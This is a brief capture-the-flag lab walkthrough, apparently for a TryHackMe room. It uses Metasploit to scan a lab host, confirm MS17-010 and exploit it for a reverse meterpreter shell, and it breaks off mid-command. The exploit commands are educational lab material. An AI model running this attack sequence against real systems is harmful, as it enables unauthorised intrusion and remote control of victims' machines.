Website [URL](https://tryhackme.com/room/rppsempire)

Powershell Empire? This is a command and control server

# Enum
want to use `msfconsole` for this whole thing

lets begin by starting the database
```bash
sudo msfdb init
msfconsole -q
```

next we will do an nmap scan
```bash
db_nmap -A --script vuln -vv -oA Empire 10.10.159.89
```

now that we have data inside our database we can check the open ports and services on the host. as well as vulnerabilities. 445 is open
```bash
services
hosts
vulns
```

based on the nmap script, this is vulnerable to MS17-010. lets run a checker
```bash
search ms17-010
use 3
options
set rhosts 10.10.159.89
exploit
```

looks like it is so lets use the proper payload now
```bash
search ms17-010
use 0
options
set rhosts 10.10.159.89
set lhost tun0
exploit
```

we get a reverse meterpreter shell since we didnt change the payload. we can do a couple of things here
```bash
getuid
g